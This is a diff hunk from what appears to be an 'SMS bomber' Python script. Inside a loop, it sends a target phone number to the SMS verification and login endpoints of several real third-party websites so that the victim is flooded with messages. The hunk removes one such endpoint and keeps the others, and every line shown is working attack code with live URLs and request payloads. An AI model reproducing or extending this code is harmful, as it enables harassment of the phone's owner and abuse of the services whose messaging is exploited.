@@ -100,11 +100,6 @@ for _ in track(range(run)):
          except:
                  print('Не отправлено (mozayka.com.ua)')
          try:#ok
-                 requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers)
-                 print('kazan-divan.eatery.club')
-         except:
-                 print('Не доставлено (kazan-divan.eatery.club)')
-         try:#ok
                  requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers)
                  print('groshivsim.com')
          except:
